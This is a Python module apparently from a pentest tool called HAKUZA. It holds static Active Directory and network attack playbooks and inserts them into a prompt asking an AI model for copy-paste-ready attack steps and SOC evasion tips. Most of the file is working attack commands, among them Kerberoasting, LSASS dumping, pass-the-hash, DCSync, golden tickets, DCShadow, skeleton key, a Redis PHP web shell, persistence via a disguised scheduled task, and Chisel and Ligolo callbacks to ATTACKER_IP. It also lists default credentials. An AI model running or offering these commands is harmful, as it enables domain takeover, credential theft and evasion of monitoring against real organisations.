# mod_ad_network.py — Active Directory & Network Pentest Module for HAKUZA
# Merged into hakuza.py at build time. All functions use interfaces above.
#
# Author  : Divith D Shetty | CEH · CRTP · CAISP
# Purpose : cmd_ad, cmd_network, cmd_lateral — AD & network pentest playbooks
#
import os
import sys
import json
import re
import subprocess
import shutil
from pathlib import Path
from datetime import datetime

# At merge time all hakuza_interfaces symbols are already in scope.
# This import line is kept as the canonical merge marker.
from hakuza_interfaces import *  # noqa: F401,F403

# ---------------------------------------------------------------------------
# BLOODHOUND CYPHER REFERENCE (BFSI-tuned top-10 queries)
# ---------------------------------------------------------------------------

_BLOODHOUND_QUERIES = [
    (
        "Shortest paths to Domain Admins",
        "MATCH p=shortestPath((u:User)-[*1..]->(g:Group {name:'DOMAIN ADMINS@<DOMAIN>'})) "
        "RETURN p LIMIT 25",
    ),
    (
        "All Kerberoastable users",
        "MATCH (u:User {hasspn:true}) WHERE u.enabled=true "
        "RETURN u.name, u.serviceprincipalnames ORDER BY u.name",
    ),
    (
        "All ASREPRoastable users (no pre-auth)",
        "MATCH (u:User {dontreqpreauth:true}) WHERE u.enabled=true "
        "RETURN u.name ORDER BY u.name",
    ),
    (
        "Computers with Unconstrained Delegation",
        "MATCH (c:Computer {unconstraineddelegation:true}) "
        "RETURN c.name, c.operatingsystem ORDER BY c.name",
    ),
    (
        "Users with GenericAll/WriteDACL/GenericWrite on DA group",
        "MATCH p=(u:User)-[:GenericAll|WriteDACL|GenericWrite]->"
        "(g:Group {name:'DOMAIN ADMINS@<DOMAIN>'}) RETURN p",
    ),
    (
        "Active sessions of Domain Admins (find their workstations)",
        "MATCH p=(c:Computer)-[:HasSession]->(u:User)-[:MemberOf*1..]->"
        "(g:Group {name:'DOMAIN ADMINS@<DOMAIN>'}) RETURN p",
    ),
    (
        "High-value targets reachable from owned nodes",
        "MATCH p=shortestPath((owned:Computer {owned:true})-[*1..]->"
        "(g:Group {name:'DOMAIN ADMINS@<DOMAIN>'})) RETURN p LIMIT 20",
    ),
    (
        "Users with DCSync rights (GetChanges + GetChangesAll)",
        "MATCH p=(u)-[:DCSync|GetChanges|GetChangesAll]->(d:Domain) RETURN p",
    ),
    (
        "Find ADCS certificate templates vulnerable to ESC1",
        "MATCH (t:GPO)-[:Enroll|AutoEnroll]->(ct:CertTemplate) "
        "WHERE ct.requiresmanagerapproval=false AND ct.authenticationenabled=true "
        "AND ct.enrolleesuppliessubject=true RETURN ct.name, ct.oid",
    ),
    (
        "Computers where domain users are local admins",
        "MATCH p=(g:Group {name:'DOMAIN USERS@<DOMAIN>'})-[:AdminTo]->(c:Computer) "
        "RETURN c.name ORDER BY c.name",
    ),
]

# ---------------------------------------------------------------------------
# AD PHASE DETAILS (static playbook content injected into the AI prompt)
# ---------------------------------------------------------------------------

_AD_PHASES_STATIC = r"""\
## Phase 1 — Enumeration

### Domain Enumeration
```bash
# enum4linux-ng — comprehensive null-session enum
enum4linux-ng -A <DC_IP> -oJ enum4linux_<DOMAIN>.json

# LDAP anonymous bind — grab naming context first
ldapsearch -x -H ldap://<DC_IP> -s base namingContexts
ldapsearch -x -H ldap://<DC_IP> -b "DC=<DC>,DC=<TLD>" "(objectClass=user)" \
  sAMAccountName userPrincipalName memberOf pwdLastSet accountExpires

# CrackMapExec domain info
crackmapexec smb <DC_IP> -u '' -p '' --domain-info
crackmapexec ldap <DC_IP> -u '' -p '' --get-sid

# BloodHound Python ingestor (from Linux, no implant needed)
bloodhound-python -u <USER> -p '<PASS>' -d <DOMAIN> -ns <DC_IP> -c All \
  --zip -o bloodhound_<DOMAIN>.zip
```

### User Enumeration
```bash
# kerbrute — no creds needed
kerbrute userenum -d <DOMAIN> --dc <DC_IP> ~/wordlists/usernames.txt \
  -o kerbrute_valid_users.txt

# LDAP with credentials
ldapsearch -x -H ldap://<DC_IP> -D "<USER>@<DOMAIN>" -w '<PASS>' \
  -b "DC=<DC>,DC=<TLD>" "(objectClass=user)" sAMAccountName description
```

### Share Enumeration
```bash
# Null session share list
smbclient -L //<DC_IP> -N
crackmapexec smb <DC_IP> -u '' -p '' --shares
crackmapexec smb <SUBNET>/24 -u '' -p '' --shares 2>/dev/null | grep READ
```

---

## Phase 2 — Initial Foothold

### AS-REP Roasting (no password required)
```bash
# Get users without Kerberos pre-auth (from external, no creds)
impacket-GetNPUsers <DOMAIN>/ -usersfile kerbrute_valid_users.txt \
  -format hashcat -outputfile asrep_hashes.txt -dc-ip <DC_IP>

# With valid domain creds — enumerate all vulnerable accounts
impacket-GetNPUsers <DOMAIN>/<USER>:<PASS> -request -format hashcat \
  -outputfile asrep_hashes.txt -dc-ip <DC_IP>

# Crack with hashcat
hashcat -m 18200 asrep_hashes.txt ~/wordlists/rockyou.txt \
  -r ~/wordlists/rules/best64.rule --force
```

### Password Spraying (BFSI-safe: 1 attempt per 30 min)
```bash
# Common BFSI passwords to try (1 at a time, 30-min gaps):
# Winter2024! Summer2024! Password@123 Welcome@1 Company@2024 Admin@123
# P@ssw0rd Passw0rd! Jan@2024 Feb@2024 ...

crackmapexec smb <DC_IP> -u valid_users.txt -p 'Winter2024!' \
  --no-bruteforce --continue-on-success

# kerbrute spray (built-in lockout-safe mode)
kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> valid_users.txt 'Winter2024!'
```

### Null Session / Anonymous LDAP
```bash
# Test anonymous LDAP bind — BFSI environments often leave this open
ldapsearch -x -H ldap://<DC_IP> -b "DC=<DC>,DC=<TLD>" "(objectClass=*)" \
  | grep -E "sAMAccountName|description|memberOf" | head -100

# rpcclient null session
rpcclient -U "" -N <DC_IP> -c "enumdomusers"
rpcclient -U "" -N <DC_IP> -c "querydominfo"
```

---

## Phase 3 — Privilege Escalation

### Kerberoasting
```bash
# Get all Service Principal Names (any authenticated user)
impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> \
  -request -outputfile kerberoast_hashes.txt

# Crack TGS hashes
hashcat -m 13100 kerberoast_hashes.txt ~/wordlists/rockyou.txt \
  -r ~/wordlists/rules/best64.rule -r ~/wordlists/rules/d3ad0ne.rule --force

# Targeted — high-value accounts only (DA, svc accounts)
impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> \
  -request-user svc_sql -outputfile targeted_spn.txt
```

### ACL Abuse
```bash
# BloodHound — find dangerous ACLs from your owned node
# In BloodHound GUI: Node → Outbound Object Control → Transitive Object Control

# GenericAll over a user — reset their password
net rpc password <TARGET_USER> 'NewPass@123' -U <DOMAIN>/<YOUR_USER>%<PASS> \
  -S <DC_IP>

# WriteDACL — grant yourself DCSync rights
impacket-dacledit -action 'write' -rights 'DCSync' -principal <YOUR_USER> \
  -target-dn 'DC=<DC>,DC=<TLD>' <DOMAIN>/<YOUR_USER>:<PASS> -dc-ip <DC_IP>
```

### ADCS Attacks (Certipy)
```bash
# ESC1-ESC8 enumeration
certipy find -u <USER>@<DOMAIN> -p '<PASS>' -dc-ip <DC_IP> -vulnerable -stdout

# ESC1 — enroll with arbitrary SAN (impersonate DA)
certipy req -u <USER>@<DOMAIN> -p '<PASS>' -ca '<CA_NAME>' \
  -template '<VULN_TEMPLATE>' -upn administrator@<DOMAIN> -dc-ip <DC_IP>
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>

# ESC8 — NTLM relay to AD CS HTTP endpoint
certipy relay -target 'http://<CA_HOST>/certsrv/certfnsh.asp' -ca '<CA_NAME>'
```

### GPO Abuse / lsass / Token Impersonation
```bash
# GPO abuse via SharpGPOAbuse (if you have write on a GPO)
SharpGPOAbuse.exe --AddComputerTask --TaskName "hakuza" \
  --Author "<DOMAIN>\Administrator" --Command "cmd.exe" \
  --Arguments "/c net localgroup administrators <USER> /add" \
  --GPOName "<TARGET_GPO>"

# lsass dump (local admin required)
rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump \
  (Get-Process lsass).Id lsass.dmp full
# Parse with pypykatz / Mimikatz
pypykatz lsa minidump lsass.dmp

# Token impersonation with Incognito (Metasploit)
meterpreter> use incognito
meterpreter> list_tokens -u
meterpreter> impersonate_token "<DOMAIN>\\Administrator"
```

---

## Phase 4 — Lateral Movement

### Pass-the-Hash
```bash
# CrackMapExec PTH — validate across the network
crackmapexec smb <SUBNET>/24 -u Administrator -H <NT_HASH> \
  --local-auth 2>/dev/null | grep '+'

# Impacket psexec / smbexec PTH
impacket-psexec -hashes :<NT_HASH> <DOMAIN>/Administrator@<TARGET_IP>
impacket-smbexec -hashes :<NT_HASH> <DOMAIN>/Administrator@<TARGET_IP>

# Mimikatz PTH (Windows, from DA session)
sekurlsa::pth /user:Administrator /domain:<DOMAIN> /ntlm:<NT_HASH> /run:cmd.exe
```

### Pass-the-Ticket
```bash
# Export ticket with Mimikatz
sekurlsa::tickets /export
kerberos::ptt <ticket.kirbi>

# Rubeus — request TGT and inject
Rubeus.exe asktgt /user:<USER> /rc4:<NT_HASH> /ptt
Rubeus.exe ptt /ticket:<base64_ticket>

# Impacket ticket injection (Linux)
export KRB5CCNAME=Administrator.ccache
impacket-psexec <DOMAIN>/Administrator@<TARGET> -k -no-pass
```

### Over-Pass-the-Hash (Pass-the-Key)
```bash
# Rubeus with AES key (less noisy — no 4768/4771)
Rubeus.exe asktgt /user:<USER> /aes256:<AES256_HASH> /opsec /ptt

# Impacket with AES key
impacket-getTGT <DOMAIN>/<USER> -aesKey <AES256_KEY> -dc-ip <DC_IP>
```

### WMI / PSExec / SMBExec Lateral Movement
```bash
# WMI exec (port 135 — often less monitored)
impacket-wmiexec <DOMAIN>/<USER>:<PASS>@<TARGET_IP>
crackmapexec smb <TARGET_IP> -u <USER> -p '<PASS>' -x "whoami /all"

# PSExec (creates service — noisy)
impacket-psexec <DOMAIN>/<USER>:<PASS>@<TARGET_IP>

# atexec — scheduled task exec (port 445, no service created)
impacket-atexec <DOMAIN>/<USER>:<PASS>@<TARGET_IP> "whoami"
```

---

## Phase 5 — Domain Dominance

### DCSync
```bash
# secretsdump.py — dump all NTLM hashes from NTDS (requires DCSync rights)
impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<DC_IP> -just-dc-ntlm \
  -outputfile ntds_hashes.txt

# Or with NT hash
impacket-secretsdump -hashes :<NT_HASH> <DOMAIN>/Administrator@<DC_IP> \
  -just-dc-ntlm -outputfile ntds_hashes.txt

# Mimikatz DCSync (from DA session on Windows)
lsadump::dcsync /domain:<DOMAIN> /all /csv
lsadump::dcsync /domain:<DOMAIN> /user:krbtgt
```

### Golden Ticket
```bash
# Collect: domain SID + krbtgt NTLM hash (from DCSync)
# domain SID format: S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX

# Mimikatz Golden Ticket
kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<KRBTGT_NTLM> \
  /user:Administrator /id:500 /ptt

# Impacket ticketer
impacket-ticketer -nthash <KRBTGT_NTLM> -domain-sid <DOMAIN_SID> \
  -domain <DOMAIN> Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec <DOMAIN>/Administrator@<DC_IP> -k -no-pass
```

### Silver Ticket (service-specific, less detectable)
```bash
# Target CIFS/HOST/LDAP on a specific server
impacket-ticketer -nthash <SERVICE_ACCOUNT_NTLM> -domain-sid <DOMAIN_SID> \
  -domain <DOMAIN> -spn cifs/<SERVER_FQDN> -user-id 500 Administrator
export KRB5CCNAME=Administrator.ccache
impacket-smbclient <DOMAIN>/Administrator@<SERVER_FQDN> -k -no-pass
```

### DCSHADOW (stealth persistence — bypasses most SIEM rules)
```bash
# Mimikatz DCSHADOW — register rogue DC, push attribute changes
# Requires 2 Mimikatz sessions (one as DA, one as SYSTEM)
# Session 1 (SYSTEM): lsadump::dcshadow /push
# Session 2 (DA):     lsadump::dcshadow /object:targetuser /attribute:primaryGroupID /value:512
# Detection evasion: changes bypass normal replication event logs
```

---

## Phase 6 — Post-Exploitation

### NTDS.dit Extraction
```bash
# Volume Shadow Copy method (no AV trigger)
vssadmin create shadow /for=C:
copy \\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit C:\\ntds.dit
copy \\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\system.hive
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL -outputfile domain_hashes.txt

# ntdsutil snapshot method
ntdsutil "ac i ntds" "ifm" "create full C:\\ntds_dump" q q
```

### LSA Secrets & DPAPI
```bash
# LSA secrets (service account creds, cached domain creds)
impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<TARGET_IP> -just-lsa

# DPAPI master key extraction
# On target: locate master keys
dir /a C:\Users\*\AppData\Roaming\Microsoft\Protect\

# Impacket dpapi
impacket-dpapi masterkey -file <MASTERKEY_FILE> -sid <USER_SID> \
  -password '<USER_PASS>'
impacket-dpapi credential -file <CRED_FILE> -key <DPAPI_KEY>
```

### Persistence
```bash
# Scheduled task (SYSTEM level)
schtasks /create /sc onlogon /tn "WindowsUpdate" /tr "C:\\Temp\\beacon.exe" \
  /ru SYSTEM /f

# WMI event subscription (fileless persistence)
$filter = Set-WmiInstance -Class __EventFilter -Namespace root\\subscription \
  -Arguments @{Name='HakuzaTrigger';EventNamespace='root\\cimv2';
    QueryLanguage='WQL';Query="SELECT * FROM __TimerEvent WHERE TimerID='HakuzaTimer'"}

# Skeleton Key (patches LSASS — lets any account auth with master password)
# Mimikatz: misc::skeleton
# After: any account can auth with password 'mimikatz' while real creds still work
```
"""

# ---------------------------------------------------------------------------
# cmd_ad
# ---------------------------------------------------------------------------

def cmd_ad(args, console) -> None:
    """
    hakuza ad [--dc <ip>] [--domain <domain>] [--user <user>] [--save]

    Generates a complete Active Directory pentest playbook for the current
    engagement via Claude (streamed), then offers to log phase findings.
    Also prints a BloodHound Cypher query reference.
    """
    eng = _require_engagement(console)
    client = get_client()

    dc_ip    = getattr(args, "dc",     None) or eng.get("target", "<DC_IP>")
    domain   = getattr(args, "domain", None) or "<DOMAIN>"
    user     = getattr(args, "user",   None) or "<USER>"
    do_save  = getattr(args, "save",   False)

    # ------------------------------------------------------------------
    # Header panel
    # ------------------------------------------------------------------
    console.print(
        Panel(
            f"[bold]Engagement:[/bold]  {eng['name']}\n"
            f"[bold]Client:[/bold]      {eng['client']}\n"
            f"[bold]DC / Target:[/bold] {dc_ip}\n"
            f"[bold]Domain:[/bold]      {domain}\n"
            f"[bold]User:[/bold]        {user}",
            title="[bold red]  HAKUZA — Active Directory Pentest[/bold red]",
            border_style="red",
            expand=False,
        )
    )

    # ------------------------------------------------------------------
    # AI playbook generation
    # ------------------------------------------------------------------
    console.print(Rule("[bold cyan]AI-Generated AD Pentest Playbook[/bold cyan]", style="dim cyan"))

    prompt = (
        f"You are conducting an Active Directory penetration test for a BFSI client.\n\n"
        f"Engagement: {eng['name']}\n"
        f"Client: {eng['client']}\n"
        f"Target DC IP: {dc_ip}\n"
        f"Domain: {domain}\n"
        f"Starting user (if any): {user}\n\n"
        f"The tester is Divith D Shetty (CEH, CRTP). Produce a complete, copy-paste-ready "
        f"AD pentest playbook. Use the following phase structure exactly:\n\n"
        f"{_AD_PHASES_STATIC}\n\n"
        f"For each command, substitute {dc_ip} for <DC_IP>, {domain} for <DOMAIN>/<DC>/<TLD>, "
        f"and {user} for <USER> wherever appropriate.\n\n"
        f"After the 6 phases, add:\n"
        f"## BFSI-Specific Risks\n"
        f"List 5 AD misconfigurations that are uniquely impactful for BFSI environments "
        f"(core banking access, SWIFT network segregation, payment systems, regulatory audit trails).\n\n"
        f"## Detection Evasion Tips\n"
        f"3 concise tips to stay under the radar of a SOC using Sentinel / Splunk / CrowdStrike.\n\n"
        f"Format every code block with triple backticks and the language tag (bash/powershell)."
    )

    response = stream_to_console(
        client,
        [{"role": "user", "content": prompt}],
        max_tokens=4096,
        console=console,
    )

    # ------------------------------------------------------------------
    # Save to file if requested
    # ------------------------------------------------------------------
    if do_save and response:
        ts = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
        eng_dir = HAKUZA_DIR / "engagements" / eng["name"]
        reports_dir = eng_dir / "reports"
        reports_dir.mkdir(parents=True, exist_ok=True)
        out_path = reports_dir / f"ad_playbook_{ts}.md"
        header = (
            f"# AD Pentest Playbook — {eng['name']}\n"
            f"**Date:** {datetime.utcnow().strftime('%Y-%m-%d %H:%M UTC')}\n"
            f"**DC:** {dc_ip}  |  **Domain:** {domain}\n\n---\n\n"
        )
        out_path.write_text(header + response)
        console.print(f"\n[green]Playbook saved:[/green] {out_path}")

    # ------------------------------------------------------------------
    # BloodHound Cypher reference
    # ------------------------------------------------------------------
    console.print()
    console.print(Rule("[bold magenta]BloodHound Cypher Query Reference — BFSI Top 10[/bold magenta]", style="dim magenta"))

    bh_table = Table(
        title="BloodHound Cypher Queries",
        box=box.ROUNDED,
        show_header=True,
        header_style="bold magenta",
        expand=True,
    )
    bh_table.add_column("#", width=3, justify="right", style="dim")
    bh_table.add_column("Purpose", ratio=1, style="bold white")
    bh_table.add_column("Cypher Query", ratio=3, style="cyan", overflow="fold")

    for idx, (purpose, query) in enumerate(_BLOODHOUND_QUERIES, 1):
        bh_table.add_row(str(idx), purpose, query)

    console.print(bh_table)
    console.print(
        "[dim]Replace [bold]<DOMAIN>[/bold] with your NetBIOS domain name in UPPERCASE "
        "(e.g. CORPNET). Mark owned nodes in BloodHound before running path queries.[/dim]"
    )

    # ------------------------------------------------------------------
    # Offer to log findings per phase
    # ------------------------------------------------------------------
    console.print()
    console.print(Rule("[bold yellow]Log Findings[/bold yellow]", style="dim yellow"))
    console.print(
        "[yellow]Do you want to log placeholder findings for each AD phase?\n"
        "You can edit them later with [bold]hakuza update[/bold].[/yellow]"
    )

    phase_findings = [
        ("Domain Enumeration",   "medium", 5.3, "AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N", "CWE-200",
         "T1018",
         "Unauthenticated LDAP bind / null session exposes AD user and group data.",
         "Disable anonymous LDAP bind; enforce SMB signing; restrict null sessions via GPO."),
        ("AS-REP Roasting",      "high",   7.5, "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", "CWE-522",
         "T1558.004",
         "Accounts with Kerberos pre-authentication disabled allow offline hash cracking "
         "without any credentials.",
         "Enable Kerberos pre-authentication on all accounts; enforce strong passwords "
         "(20+ chars) for service accounts."),
        ("Kerberoasting",        "high",   7.5, "AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N", "CWE-522",
         "T1558.003",
         "Service accounts with weak passwords and SPNs set are vulnerable to offline "
         "TGS hash cracking by any domain user.",
         "Managed Service Accounts (MSA/gMSA) for all service accounts; enforce 30+ char "
         "random passwords; monitor 4769 events."),
        ("ACL / ADCS Abuse",     "critical", 9.0, "AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H", "CWE-285",
         "T1484.001",
         "Dangerous ACL delegations (WriteDACL, GenericAll) or vulnerable ADCS templates "
         "allow a low-privileged user to escalate to Domain Admin.",
         "Audit AD ACLs with BloodHound quarterly; remediate ESC1–ESC8 ADCS misconfigs; "
         "remove unnecessary GenericAll / WriteDACL permissions."),
        ("DCSync / Domain Dominance", "critical", 10.0, "AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H",
         "CWE-522", "T1003.006",
         "DCSync rights allow extraction of all NTLM password hashes, enabling "
         "Golden Ticket creation and permanent domain compromise.",
         "Restrict DCSync rights to DC machine accounts only; enable Microsoft ATA / "
         "Defender for Identity; alert on 4662 events for 'Replicating Directory Changes'."),
        ("Post-Exploitation Persistence", "critical", 9.0,
         "AV:L/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H", "CWE-284",
         "T1078.002",
         "Attacker established persistent access via scheduled tasks, WMI subscriptions, "
         "or skeleton key patch.",
         "Deploy PAM (Privileged Access Management); enable LAPS; monitor Sysmon Event IDs "
         "1/7/19/20; enforce Credential Guard."),
    ]

    try:
        from rich.prompt import Confirm
        log_all = Confirm.ask("Log all 6 phase findings now?", default=False)
    except Exception:
        log_all = False

    if log_all:
        for title, sev, cvss, vector, cwe, mitre, desc, rem in phase_findings:
            finding = add_finding(
                engagement_id=eng["id"],
                title=f"AD — {title}",
                severity=sev,
                cvss_score=cvss,
                cvss_vector=vector,
                cwe=cwe,
                mitre=mitre,
                description=desc,
                remediation=rem,
                tool="hakuza-ad",
                url=dc_ip,
            )
            console.print(
                f"  [green]Logged:[/green] {sev_badge(sev)}  "
                f"[bold]{finding.get('short_id','')}[/bold]  AD — {title}"
            )
        console.print(
            f"\n[green]All 6 phase findings saved.[/green] "
            f"Edit with [cyan]hakuza update <short_id>[/cyan]."
        )
    else:
        console.print("[dim]Skipped. Use [bold]hakuza add[/bold] to log findings manually.[/dim]")

    console.print()
    console.print(
        Panel(
            f"[bold green]AD playbook complete.[/bold green]\n\n"
            f"Next: [cyan]hakuza lateral --from-host {dc_ip}[/cyan] for lateral movement chains.\n"
            f"Then: [cyan]hakuza findings[/cyan] to review all logged issues.",
            title="[bold]Done[/bold]",
            border_style="green",
            expand=False,
        )
    )


# ---------------------------------------------------------------------------
# NETWORK PHASE DETAILS (injected into AI prompt as reference)
# ---------------------------------------------------------------------------

_NETWORK_PHASES_STATIC = r"""\
## Phase 1 — Host Discovery

```bash
# Ping sweep (ICMP)
nmap -sn <RANGE> -oG - | grep "Up" | awk '{print $2}' > live_hosts.txt

# ARP scan (local segment — more reliable, avoids firewall drops)
arp-scan --localnet --retry=2
arp-scan <RANGE>

# NetBIOS sweep (Windows environments)
nbtscan -r <RANGE>
```

## Phase 2 — Service Enumeration

### Quick scan (common ports, T4)
```bash
nmap -sV -sC -T4 --open \
  -p 21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1723,\
3306,3389,5900,8080,8443 <RANGE> -oA hakuza_quick
```

### Full scan (all 65535 ports, T3 — stealth-friendly)
```bash
nmap -sV -sC -T3 -p- --open <RANGE> -oA hakuza_full
```

### Stealth scan (SYN-only, T2, IDS evasion)
```bash
nmap -sS -T2 --open -p- <RANGE> -oA hakuza_stealth
# Fragment packets for IDS bypass
nmap -sS -f --mtu 24 -T2 --open -p- <RANGE>
```

## Phase 3 — Protocol-Specific Attacks

### SMB (445 / 139)
```bash
# EternalBlue check
nmap -p 445 --script smb-vuln-ms17-010 <HOST>
crackmapexec smb <HOST> -M ms17-010

# Null session / share enum
smbclient -L //<HOST> -N
crackmapexec smb <HOST> -u '' -p '' --shares
enum4linux-ng -S <HOST>

# NTLM relay (disable SMB signing first)
crackmapexec smb <RANGE> --gen-relay-list relay_targets.txt
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -l loot/
```

### LDAP (389 / 636)
```bash
# Anonymous bind dump
ldapsearch -x -H ldap://<HOST> -b "" -s base "(objectClass=*)" \
  namingContexts supportedSASLMechanisms
ldapsearch -x -H ldap://<HOST> -b "DC=<DC>,DC=<TLD>" "(objectClass=user)" \
  sAMAccountName | grep "sAMAccountName:"
```

### Kerberos (88)
```bash
# User enumeration (no creds)
kerbrute userenum -d <DOMAIN> --dc <HOST> usernames.txt

# AS-REP roasting
impacket-GetNPUsers <DOMAIN>/ -usersfile valid_users.txt \
  -format hashcat -dc-ip <HOST> -outputfile asrep.txt
```

### RDP (3389)
```bash
# BlueKeep (CVE-2019-0708)
nmap -p 3389 --script rdp-vuln-ms12-020 <HOST>
nuclei -u rdp://<HOST>:3389 -tags rdp,cve

# NLA check (Network Level Auth)
nmap -p 3389 --script rdp-enum-encryption <HOST>

# Credential spray (safe: 1 attempt per 30 min)
crackmapexec rdp <HOST> -u users.txt -p 'Password@123' --no-bruteforce
```

### WinRM (5985 / 5986)
```bash
# Check if accessible
crackmapexec winrm <HOST> -u <USER> -p '<PASS>'

# Shell
evil-winrm -i <HOST> -u <USER> -p '<PASS>'
evil-winrm -i <HOST> -u <USER> -H <NT_HASH>
```

### MSSQL (1433)
```bash
# Default creds + xp_cmdshell
crackmapexec mssql <HOST> -u sa -p sa --local-auth
crackmapexec mssql <HOST> -u sa -p '' -q "SELECT @@version"
impacket-mssqlclient <USER>:<PASS>@<HOST> -windows-auth
# In mssqlclient: EXEC xp_cmdshell 'whoami'
# Linked servers: SELECT * FROM sys.servers

# UNC path injection (capture NetNTLM hash)
EXEC xp_dirtree '\\<ATTACKER_IP>\\share'
```

### MySQL (3306) / PostgreSQL (5432)
```bash
# MySQL default creds
crackmapexec mssql <HOST> -u root -p '' --local-auth
mysql -h <HOST> -u root -p'' -e "SELECT user();"

# PostgreSQL UDF injection
COPY cmd_exec FROM PROGRAM 'id';  -- requires superuser
```

### Redis (6379)
```bash
# Unauthenticated access check
redis-cli -h <HOST> ping
redis-cli -h <HOST> info server | head -20

# RCE via config set (if writable)
redis-cli -h <HOST> config set dir /var/www/html
redis-cli -h <HOST> config set dbfilename shell.php
redis-cli -h <HOST> set payload '<?php system($_GET["cmd"]); ?>'
redis-cli -h <HOST> save
```

### MongoDB (27017)
```bash
# Unauthenticated access
mongosh --host <HOST> --port 27017
# In mongo shell: show dbs; use admin; db.system.users.find()
```

### Elasticsearch (9200)
```bash
curl -s http://<HOST>:9200/_cat/indices?v
curl -s http://<HOST>:9200/_cat/nodes?v
curl -s "http://<HOST>:9200/<INDEX>/_search?size=10&pretty"
```

### Jenkins (8080 / 8443)
```bash
# Script console RCE (unauthenticated or with weak creds)
curl http://<HOST>:8080/script -d 'script=println("id".execute().text)'
# Default creds: admin/admin, admin/password, jenkins/jenkins
crackmapexec http <HOST>:8080 -u admin -p admin --jenkins
```

### FTP (21)
```bash
# Anonymous login
nmap -p 21 --script ftp-anon <HOST>
ftp <HOST>   # username: anonymous, password: (blank)

# FTP bounce attack (internal port scan)
nmap -p 21 --script ftp-bounce --script-args ftp-bounce.username=anonymous \
  -b ftp://<HOST> <INTERNAL_RANGE>
```

## Phase 4 — MITM & Relay Attacks

### Responder (capture NetNTLM hashes)
```bash
# Start Responder on your interface
responder -I <INTERFACE> -wdF

# Crack captured hashes
hashcat -m 5600 responder_hashes.txt ~/wordlists/rockyou.txt \
  -r ~/wordlists/rules/best64.rule
```

### NTLM Relay
```bash
# Disable Responder SMB/HTTP first, then relay
impacket-ntlmrelayx -tf relay_targets.txt -smb2support \
  -l loot/ --no-http-server

# Relay to LDAP for RBCD or DCSync
impacket-ntlmrelayx -t ldap://<DC_IP> -smb2support \
  --delegate-access --escalate-user <COMPROMISED_USER>
```

### ARP Poisoning with Bettercap
```bash
bettercap -iface <INTERFACE>
# In bettercap REPL:
net.probe on
arp.spoof.targets <VICTIM_IP>,<GATEWAY_IP>
arp.spoof on
net.sniff on
```

### IPv6 Attacks (mitm6)
```bash
# mitm6 poisons IPv6 DNS, relays auth to DC
mitm6 -d <DOMAIN> -i <INTERFACE>
# In parallel:
impacket-ntlmrelayx -6 -t ldaps://<DC_IP> -smb2support \
  --delegate-access -wh attacker-wpad
```

## Phase 5 — Pivoting

### SSH Tunnels
```bash
# Local port forward (expose remote service locally)
ssh -L 127.0.0.1:1433:<MSSQL_HOST>:1433 <USER>@<JUMP_HOST> -N -f

# Remote port forward (expose attacker tool on pivot)
ssh -R 0.0.0.0:8080:127.0.0.1:8080 <USER>@<JUMP_HOST> -N -f

# Dynamic SOCKS5 proxy (all traffic through pivot)
ssh -D 1080 <USER>@<JUMP_HOST> -N -f
# Then: proxychains nmap -sT -Pn <INTERNAL_RANGE>
```

### Chisel (TCP proxy — works where SSH is blocked)
```bash
# Attacker (server)
chisel server -p 8000 --reverse

# Pivot (client)
chisel client <ATTACKER_IP>:8000 R:1080:socks

# Proxychains: set socks5 127.0.0.1 1080 in /etc/proxychains4.conf
proxychains crackmapexec smb <INTERNAL_RANGE> -u <USER> -p '<PASS>'
```

### Ligolo-ng (TUN adapter — transparent pivoting)
```bash
# Attacker (proxy server)
./proxy -selfcert -laddr 0.0.0.0:11601

# Pivot (agent)
./agent -connect <ATTACKER_IP>:11601 -ignore-cert

# In ligolo-ng console:
session → select session → start
# Create TUN route: ip route add <INTERNAL_SUBNET> dev ligolo
```
"""

_NETWORK_COMMON_CREDS = [
    ("administrator", "Administrator@123"),
    ("administrator", "Admin@123"),
    ("administrator", "Password@1"),
    ("sa",            "sa"),
    ("sa",            ""),
    ("root",          "root"),
    ("root",          ""),
    ("admin",         "admin"),
    ("admin",         "admin@123"),
    ("jenkins",       "jenkins"),
    ("elastic",       "changeme"),
    ("redis",         "redis"),
    ("postgres",      "postgres"),
    ("tomcat",        "tomcat"),
    ("tomcat",        "s3cret"),
]


# ---------------------------------------------------------------------------
# cmd_network
# ---------------------------------------------------------------------------

def cmd_network(args, console) -> None:
    """
    hakuza network [--range <CIDR>] [--profile quick|full|stealth] [--save]

    Generates an AI-augmented network pentest playbook with host discovery,
    service enumeration, protocol attacks, MITM, and pivoting.
    """
    eng = _require_engagement(console)
    client = get_client()

    cidr_range = getattr(args, "range",   None) or eng.get("target", "<RANGE>")
    profile    = getattr(args, "profile", "quick") or "quick"
    do_save    = getattr(args, "save",    False)

    if profile not in ("quick", "full", "stealth"):
        console.print(f"[yellow]Unknown profile '{profile}' — defaulting to 'quick'.[/yellow]")
        profile = "quick"

    nmap_cmds = {
        "quick": (
            f"nmap -sV -sC -T4 --open "
            f"-p 21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,"
            f"1723,3306,3389,5900,8080,8443 {cidr_range} -oA hakuza_quick"
        ),
        "full": f"nmap -sV -sC -T3 -p- --open {cidr_range} -oA hakuza_full",
        "stealth": f"nmap -sS -T2 --open -p- {cidr_range} -oA hakuza_stealth",
    }

    console.print(
        Panel(
            f"[bold]Engagement:[/bold]  {eng['name']}\n"
